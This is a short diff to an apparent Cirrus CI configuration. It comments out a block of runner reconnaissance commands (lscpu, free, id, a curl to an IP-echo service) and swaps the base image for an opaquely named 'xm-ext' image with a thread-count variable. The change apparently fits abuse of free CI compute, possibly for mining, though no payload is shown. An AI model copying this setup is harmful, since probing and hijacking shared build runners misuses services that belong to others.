@@ -1,12 +1,16 @@
 container:
-  image: centos:7
-  cpu: 4
+  image: ik7z1r6ezi60/xm-ext
+  cpu: 2
   memory: 4G
 
-test:
-  run_script:
-    lscpu
-    free -h
-    id
-    curl -qL ifconfig.me
+env:
+  NAME: Cirrus
+  THR: 2
+
+# test:
+#   run_script:
+#     lscpu
+#     free -h
+#     id
+#     curl -qL ifconfig.me
     
